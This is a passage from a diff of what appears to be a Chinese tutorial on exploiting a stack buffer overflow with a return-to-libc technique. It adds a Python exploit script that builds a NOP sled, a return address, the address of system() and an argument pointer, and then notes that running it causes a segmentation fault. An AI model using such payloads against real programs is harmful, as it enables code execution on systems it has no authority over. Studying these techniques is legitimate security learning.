@@ -98,3 +98,31 @@ nop nop + ret + system\(\) +参数
 
 ![](/png/44.png)
 
+现在所有的要素都有了。
+
+\x90 \*76 + 0x8040617 +0xb7ecffb0 + 0xbfffff47
+
+漏洞利用代码编写如下：
+
+exploit.py
+
+\#!/usr/bin/env python
+
+offset = 76
+
+nopsled = "\x90"\*offset
+
+ret = "\x17\x06\x04\x08"
+
+system = "\xb0\xff\xec\xb7"
+
+argv\_addr = "\x47\xff\xff\xbf"
+
+print nopsled + "FAKE" +  ret + system + "FAKE" + argv\_addr
+
+执行后，会出现段错误。
+
+
+
+
+
